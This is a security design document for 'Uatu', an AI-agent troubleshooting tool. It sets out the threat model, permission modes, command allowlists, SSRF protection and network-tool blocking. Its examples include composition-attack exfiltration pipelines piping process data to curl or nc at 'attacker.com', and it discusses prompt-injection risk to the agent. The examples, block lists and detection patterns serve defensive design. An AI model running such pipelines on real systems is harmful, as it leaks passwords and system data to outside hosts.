# Security Model

This document describes Uatu's security architecture, threat model, and design decisions around safe agent operation.

## Threat Model

### What We Protect Against

**1. Accidental Destructive Commands**
- Agent accidentally runs dangerous commands (`rm -rf`, `dd`, etc.)
- Misinterpreted user intent leading to data loss
- Unintended process termination

**2. Unauthorized System Modification**
- Agent making changes without user awareness
- Privilege escalation attempts
- System configuration changes

**3. Information Disclosure**
- Sensitive data in logs or investigation reports
- API keys, credentials exposed in command output
- Process information revealing private data

**4. Data Exfiltration via Network**
- Agent transmitting system data via `curl`, `wget` to external servers
- Composition attacks piping data to network tools
- DNS exfiltration encoding data in queries
- Timing attacks signaling via network requests

**5. Composition Attacks**
- Individual commands appear safe but combined are dangerous
- Example: `ps aux | grep password | base64 | curl attacker.com -d @-`
- Allowlists validate base commands but miss dangerous pipelines

**6. Prompt Injection Attacks (Partial)**

**In Autonomous Modes (Investigate/Watch)**:
- Protected: MCP tools use structured parameters (PIDs, process names as typed fields)
- Protected: No free-text parsing that could contain malicious instructions
- Protected: Agent cannot be manipulated via system data

**In Chat Mode**:
- Risk remains: Social engineering via agent's reasoning
- Risk remains: Agent could be convinced to propose dangerous commands
- Mitigation: User sees actual command before execution (not just description)
- Mitigation: User is the final security boundary

### What We Don't Protect Against

**Out of Scope**:
- Malicious users with legitimate access (if you have shell access, you can already do damage)
- Supply chain attacks on dependencies
- Physical security
- Network-level attacks (DDoS, packet sniffing, etc.)
- Platform-specific vulnerabilities:
  - WebDAV exploitation on Windows (UNC path bypass)
  - OS-level privilege escalation via SUID binaries
  - Container escape techniques
  - Kernel vulnerabilities
- Sophisticated social engineering attacks against users
- Third-party MCP servers (if you add custom MCP servers, you assume responsibility for their security)

**Assumption**: The user running Uatu has legitimate system access and is authorized to perform system troubleshooting.

## Security Architecture

### Permission System

**Two-Layer Defense**:

1. **Tool-level permissions** - Which tools are available to the agent
2. **Command-level approval** - Runtime approval for potentially dangerous operations

#### Interactive Mode (Chat)

```
User → Agent → Tool Request → Permission Check → User Approval → Execute
```

**Behavior**:
- Bash commands require explicit approval (arrow-key prompt)
- User sees command before execution
- "Always allow" option adds to allowlist
- Can deny any command

**Security properties**:
- User has full visibility and control
- No surprises
- Allowlist builds over time for trusted workflows

#### Non-Interactive Modes (Investigate, Watch)

```
User → Agent → Tool Request → Permission Check → Auto-approve (if safe) → Execute
```

**Behavior**:
- `permission_mode="bypassPermissions"` in agent options
- Tools are pre-vetted for safety
- Read-only tools by default

**Security properties**:
- Tools are explicitly allowlisted in code
- No bash execution (MCP tools only)
- Write operations (like `kill_process`) are rare and logged

### Tool Architecture

**Mode-Based Tool Selection**:

Different modes require different security models. Interactive troubleshooting needs flexibility; autonomous monitoring needs guarantees.

**Chat Mode** (Interactive):
- **Primary**: Bash commands with explicit user approval
- **Fallback**: MCP tools when `UATU_READ_ONLY=true`
- Every bash command requires user approval (permission prompt)
- User sees actual command before execution
- Can build allowlist for trusted commands
- Familiar tools: `ps`, `top`, `df`, `netstat`, `lsof`, etc.

**Investigate/Watch Modes** (Autonomous):
- **MCP tools only** - No bash access
- Explicit allowlist of 6 read-only tools
- Tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
- Permission checks bypassed (safe because all tools are read-only)
- Designed for automation and unattended operation

**Key Security Principle**:
- Chat mode: Maximum flexibility (bash) + user control (approval required)
- Autonomous modes: Safety guarantees (structured MCP tools only, no bash)

### Allowlist System (Chat Mode Only)

**Note**: The allowlist system only applies to **chat mode**. Autonomous modes (investigate/watch) don't use bash and therefore don't use the allowlist.

**Safe Commands** (base commands that can be auto-approved in chat mode):
```python
SAFE_BASE_COMMANDS = {
    "top", "ps", "df", "free", "uptime", "vm_stat", "vmstat",
    "iostat", "netstat", "lsof", "who", "w", "last",
    "dmesg", "journalctl",
}
```

These commands are read-only system monitoring tools. The list includes:
- Process monitoring: `top`, `ps`
- Resource usage: `df`, `free`, `vmstat`, `iostat`, `vm_stat` (macOS)
- Network: `netstat`, `lsof`
- Users: `who`, `w`, `last`
- Logs: `dmesg`, `journalctl`

**User-Defined Allowlist**:
- Stored in `~/.config/uatu/allowlist.json`
- Two types: base command or exact match
- User controls via `/allowlist` commands in chat mode

**Security properties**:
- Allowlist is per-user, not global
- Read-only commands prioritized
- User can audit and manage allowlist
- Bypassed when `UATU_REQUIRE_APPROVAL=true` (forces all commands to need approval)

### MCP Tool Security

**Why MCP is safer than raw bash**:
1. **Structured inputs**: Tools take typed parameters, not arbitrary strings
2. **Defined outputs**: Return structured data, not raw stdout
3. **Sandboxing potential**: MCP servers can run in containers
4. **Audit trail**: Tool calls are logged with parameters

**Current MCP tools**:
- All implemented in-process (no external MCP servers)
- Use Python's psutil (well-audited library)
- No shell execution in tool implementation

**Security Advantage Over External MCP Servers**:
- Auditable in our codebase (not third-party black boxes)
- Use well-vetted dependencies (psutil, standard library)
- No trust verification needed (unlike external MCP servers)
- Tool vulnerabilities can be patched directly in Uatu releases

**User Responsibility**:
If you extend Uatu with custom MCP servers, you assume responsibility for their security. Review server code and trust server providers carefully.

### Environment Configuration

**Read-Only Mode** (`UATU_READ_ONLY=true`):
- Disables all write operations
- Blocks `kill_process` tool
- Blocks bash commands (even with approval)
- Safe for production monitoring

**Require Approval** (`UATU_REQUIRE_APPROVAL=true`):
- Forces interactive approval for all bash commands
- Only applies to chat mode (autonomous modes don't use bash)
- Useful for sensitive environments where allowlist should be disabled

## Security by Operating Mode

### Chat Mode Security

**Access Control**:
- Interactive approval for every bash command
- User sees command before execution
- Can build allowlist over time

**Risks**:
- Social engineering: Agent convinces user to approve dangerous command
- User fatigue: Too many prompts → blind approval
- Network exfiltration: User approves `curl` without recognizing data transmission risk
- Composition attacks: `ps aux | grep password | curl attacker.com -d @-`

**Mitigations**:
- Show actual command, not just description
- Default to "Deny"
- Allow granular allowlisting to reduce prompt fatigue
- Command blocklist for network tools (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`)
- Composition detection (flags suspicious pipelines: `| curl`, `grep password`, `base64`, etc.)

### Investigate Mode Security

**Access Control**:
- Read-only MCP tools only (no bash, no write operations)
- Allowed tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
- Runs with `bypassPermissions` (safe because all tools are read-only)
- Short-lived (single investigation)
- `UATU_REQUIRE_APPROVAL` does not apply (no risky operations available)

**Risks**:
- Malicious symptom input could trigger resource-intensive queries
- Information disclosure from process details

**Mitigations**:
- MCP tools have structured inputs (can't inject commands)
- All tools are read-only
- `read_proc_file` restricted to `/proc` and `/sys` paths only
- User reviews output before taking action
- Safety enforced by restricting `allowed_tools` to read-only operations

### Watch Mode Security

**Access Control**:
- Read-only MCP tools only (same as investigate mode)
- Allowed tools: `get_system_info`, `list_processes`, `get_process_tree`, `find_process_by_name`, `check_port_binding`, `read_proc_file`
- Optional LLM investigation uses `bypassPermissions` (safe because all tools are read-only)
- Long-running process (highest risk)
- `UATU_REQUIRE_APPROVAL` does not apply (no risky operations available)

**Risks**:
- Continuous operation → more attack surface
- Anomaly investigation could trigger resource-intensive queries
- Resource exhaustion (CPU/memory from monitoring itself)

**Mitigations**:
- Investigation is optional (`--investigate` flag)
- Watchers use minimal resources (heuristics only)
- Event log provides audit trail
- Can run with `UATU_READ_ONLY=true`

## Running Uatu Safely

### Recommended Configurations

**Development/Testing**:
```bash
# Full access, interactive approval
uatu  # Chat mode with approval prompts
```

**Production Monitoring**:
```bash
# Read-only continuous monitoring
UATU_READ_ONLY=true uatu watch --investigate
```

**Automation/CI**:
```bash
# Single investigation, read-only
UATU_READ_ONLY=true uatu investigate "high CPU usage"
```

### User Privileges

**Run as non-root when possible**:
- Most monitoring doesn't need root
- Process listing works for user's processes
- System metrics available to all users

**When root is needed**:
- Killing processes owned by other users
- Reading all process details
- Some systemd operations

**Best practice**: Run as non-root, elevate only when necessary.

### Container Deployment

**Docker considerations**:
```dockerfile
# Run as non-root user
USER uatu

# Read-only root filesystem
--read-only

# Drop capabilities
--cap-drop=ALL
--cap-add=SYS_PTRACE  # Only if needed for process inspection
```

**Security properties**:
- Limited blast radius
- Can't modify host system
- Isolated from other containers

## Network Access Security

### The Challenge

Network troubleshooting requires network access, but network operations are the primary data exfiltration vector.

**Question**: How do you enable web access (WebFetch, WebSearch) without opening exfiltration vectors?

### Network Tools: WebFetch and WebSearch

**Built-in SDK Tools** (Chat Mode):
- `WebFetch` - Fetch content from URLs
- `WebSearch` - Search the web

**Security Challenge**:
- These tools bypass bash blocklists
- Can access arbitrary URLs
- Could be used for data exfiltration or SSRF attacks

### Per-Domain Approval System [Implemented]

Uatu now implements per-domain approval for network access:

#### How It Works

1. **Agent attempts WebFetch**: `WebFetch("https://docs.python.org")`
2. **URL Validation**: System validates URL for security issues
3. **Domain Check**: System checks if domain is in allowlist
4. **User Approval**: If not allowlisted, user is prompted:
   ```
   [!] Network access requested
   Tool:   WebFetch
   URL:    https://docs.python.org
   Domain: docs.python.org

   Warning: This will fetch content from the internet

     Allow once
     Allow 'docs.python.org' (add to allowlist)
     Deny
   ```
5. **Domain Allowlist**: If user chooses "Allow domain", future requests to that domain are auto-approved

#### Network Allowlist

**Storage**: `~/.config/uatu/network_allowlist.json`

**Default Allowed Domains**:
```python
# Pre-approved safe documentation sites
"docs.python.org"
"docs.anthropic.com"
"developer.mozilla.org"
"httpbin.org"  # Testing service
"httpstat.us"  # Status code testing
"example.com"  # RFC examples
```

**User Management**:
- Add domain: Approve with "Allow domain" option
- Remove domain: Manually edit JSON file (CLI command coming soon)
- Clear all: Delete `~/.config/uatu/network_allowlist.json`

#### SSRF Protection [Implemented]

**Automatic URL Validation** blocks dangerous URLs:

**Blocked Targets**:
- `localhost`, `127.0.0.1`, `::1` - Localhost access
- `192.168.*.*`, `10.*.*.*`, `172.16-31.*.*` - Private IPs
- `169.254.169.254` - AWS/Azure/DigitalOcean metadata
- `metadata.google.internal` - GCP metadata
- Link-local and reserved IPs

**Blocked Schemes**:
- `file://` - Local file access
- `ftp://` - File transfer
- Only `http://` and `https://` allowed

**Path Validation**:
- Blocks `../` path traversal
- Blocks encoded traversal (`%2e%2e`)
- Detects suspicious patterns

**Example**:
```python
# Blocked - Private IP
WebFetch("http://192.168.1.1/admin")
# Error: "Access to private IP blocked (SSRF protection): 192.168.1.1"

# Blocked - Cloud metadata
WebFetch("http://169.254.169.254/latest/meta-data/")
# Error: "Access to cloud metadata endpoint blocked"

# Allowed (after user approval)
WebFetch("https://docs.python.org/3/library/os.html")
```

#### Prompt Injection Protection

**Header Sanitization**: Only safe headers returned:
- Allowed: `content-type`, `content-length`, `server`, `cache-control`, `date`
- Blocked: `set-cookie`, custom headers, potentially malicious content
- Values truncated to 200 characters

**Separate Context**: WebFetch results processed in isolated context (SDK feature)

### Bash Network Commands

**Dangerous Commands** (Blocked in chat mode):
```python
BLOCKED_NETWORK_COMMANDS = {
    "curl", "wget", "nc", "ssh", "scp", "rsync", "ftp", "telnet"
}
```

**Safe Diagnostics** (Allowed with approval):
- `ping` - ICMP echo requests (no user data transmitted)
- `dig`, `nslookup` - DNS queries (domain name only)
- `traceroute`, `mtr` - Network path discovery
- `netstat`, `ss` - Connection listings (local data only)
- `ifconfig`, `ip addr` - Network interface info

**Composition Attack Detection**:
Even safe commands flagged if used suspiciously:
- `ping google.com | curl attacker.com` - Piping to curl flagged
- `dig example.com | nc attacker.com 1234` - Piping to netcat flagged

### Security Properties

**WebFetch Security**:
1. **Per-domain approval** - User approves each new domain
2. **Domain allowlist** - Approved domains auto-allowed
3. **SSRF protection** - Blocks localhost, private IPs, cloud metadata
4. **URL validation** - Blocks file://, path traversal
5. **Header sanitization** - Only safe headers returned
6. **Audit trail** - All network operations logged

**Autonomous Modes** (Investigate/Watch):
- **No WebFetch/WebSearch** - Network tools disabled entirely
- **Future**: Structured MCP network diagnostic tools (planned)

### Network Diagnostics (Future)

**Planned**: Safe network diagnostic MCP tools for autonomous modes:
- `check_network_connectivity(host, count)` - Validated ping wrapper
- `resolve_dns(domain, record_type)` - Validated DNS lookup
- `check_http_endpoint(url)` - HEAD requests only, validated URLs
- `trace_network_route(host, max_hops)` - Network path tracing

**Security Properties**:
1. **Structured parameters** - No command injection possible
2. **Input validation** - Hostname/IP validation before execution
3. **No data transmission** - Diagnostic queries only, no POST data
4. **Audit trail** - All parameters logged

## Logging & Audit Trail

**What gets logged**:
- All tool calls with parameters (`--log` in watch mode)
- Investigation results (`--investigation-log`)
- Bash command approvals/denials (in chat mode)
- Errors and exceptions

**Sensitive data handling**:
- Logs may contain process names, PIDs, resource usage
- Command arguments might contain sensitive data
- No automatic scrubbing (user responsibility)

**Recommendations**:
- Review logs before sharing
- Rotate logs regularly
- Restrict log file permissions (600)

## API Key Security

**Storage**:
- `.env` file in project directory (not committed)
- Environment variable `ANTHROPIC_API_KEY`
- No key storage in code or config files

**Transmission**:
- HTTPS to Anthropic API
- SDK handles secure transport

**Risks**:
- Key exposure in `.env` file
- Key in environment variables (visible to other processes)

**Mitigations**:
- `.env` in `.gitignore`
- Use restrictive file permissions (600)
- Consider secrets manager for production

## Known Limitations

### Current Gaps

1. **No rate limiting on tool calls**
   - Agent could call tools in tight loop
   - Resource exhaustion possible
   - Mitigation: Claude's built-in limits, max_turns setting

2. **Allowlist not encrypted**
   - Stored in plaintext JSON
   - Could be modified by other processes
   - Mitigation: File permissions (600)

3. **No sandboxing of MCP tools**
   - Tools run in same process as agent
   - Tool vulnerability = agent vulnerability
   - Mitigation: Use well-audited libraries (psutil)

4. **Investigation caching uses content hashing**
   - Similar anomalies get same cached response
   - Could miss subtle differences
   - Mitigation: Time-based cache expiry

### Future Enhancements

1. **Network command blocklist** [Implemented]
   - Blocks: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `ftp`, `telnet`
   - Prevents data exfiltration in chat mode
   - Environment variable override: `UATU_ALLOW_NETWORK=true` (not recommended)
   - Location: `allowlist.py:BLOCKED_NETWORK_COMMANDS`, `permissions.py:89-102`

2. **Composition attack detection** [Implemented]
   - Pattern matching for suspicious pipelines
   - Flags: `| curl`, `| nc`, `grep password`, `grep secret`, `base64`, `xxd`, command substitution
   - Forces user approval even if base command is allowlisted
   - Location: `allowlist.py:SUSPICIOUS_PATTERNS`, `permissions.py:104-120`

3. **Network diagnostic MCP tools**
   - Structured tools: `check_network_connectivity(host)`, `resolve_dns(domain)`, etc.
   - Input validation to prevent command injection
   - HEAD-only HTTP requests for endpoint checks
   - Safe alternative to bash network commands

4. **Enhanced audit logging**
   - Security event log: `~/.uatu/security.jsonl`
   - Log command approvals/denials in chat mode
   - Log allowlist modifications
   - Structured events for SIEM integration

5. **Trust verification**
   - Environment fingerprinting (hostname + user + cwd hash)
   - Prompt on first run in new environment
   - Stored in `~/.config/uatu/trusted.json`
   - Prevent accidental execution in production

6. **Credential detection and redaction**
   - Pattern matching for API keys, passwords in output
   - Warn before logging potential secrets
   - Auto-redact in investigation logs

**Low Priority**:
7. **Rate limiting** - Max tool calls per minute to prevent resource exhaustion
8. **Tool sandboxing** - Run MCP tools in separate process (low priority: tools already use safe libraries)

## Responsible Disclosure

If you discover a security vulnerability in Uatu:

1. **Do not** open a public issue
2. Email: [Maintainer email from pyproject.toml]
3. Include: Description, steps to reproduce, impact assessment
4. Allow time for patch before public Disclosure


## Security Best Practices for Users

### Before Approving Commands (Chat Mode)

**Do**:
- Read the actual command, not just the agent's description
- Verify the command matches the stated intent
- Check for unexpected redirections or pipelines
- Deny and investigate manually when in doubt

**Don't**:
- Blindly approve because you trust the agent
- Approve commands containing unfamiliar flags or options
- Approve network commands (`curl`, `wget`, `nc`, `ssh`) without understanding exactly what they do
- Approve pipelines that combine multiple tools you don't fully understand

**Red Flags to Watch For**:
- Network commands with data parameters: `curl -d`, `wget --post-data`
- Output redirection to files: `> /path/to/file`
- Commands with `sudo` or privilege escalation
- Encoding/decoding: `base64`, `xxd`, `uuencode`
- Pipelines combining data extraction and network tools

### When Deploying in Production

1. **Use `UATU_READ_ONLY=true`** for monitoring-only deployments
2. **Run in containers** with minimal capabilities (`--cap-drop=ALL`)
3. **Use secrets managers** (not .env files) for API keys in production
   - Examples: AWS Secrets Manager, HashiCorp Vault, system keyring
4. **Set up audit log monitoring** and alerting for security events
5. **Test in isolated environment** before production deployment
6. **Document approved use cases** for your team
7. **Restrict network access** if not needed (firewall rules)

### When Using Network Diagnostics (Planned Feature)

1. **Verify URLs and hostnames** before approving network commands
2. **Use MCP tools** instead of bash commands when available
3. **Never approve commands** that include user data in network requests
   - Bad: `curl api.example.com -d "$(ps aux)"`
   - Good: `check_http_endpoint("api.example.com")`
4. **Review audit logs** for unusual network activity patterns

### Regular Security Maintenance

- Review allowlist (`~/.config/uatu/allowlist.json`)
- Check audit logs for suspicious patterns
- Remove unused allowlist entries
- Rotate API keys
- Update Uatu to latest version for security patches
- Review and prune investigation logs
- Audit who has access to systems running Uatu
- Review and update security policies
- Test incident response procedures

## Philosophy

**"Trust but verify"**: Give agents capability, but with guardrails.

We believe AI agents should be:
1. **Transparent**: User sees what's happening
2. **Controllable**: User can approve/deny actions
3. **Auditable**: Complete log of what was done
4. **Safe by default**: Read-only unless explicitly authorized

The goal is empowerment, not automation for its own sake. The human remains in the loop.
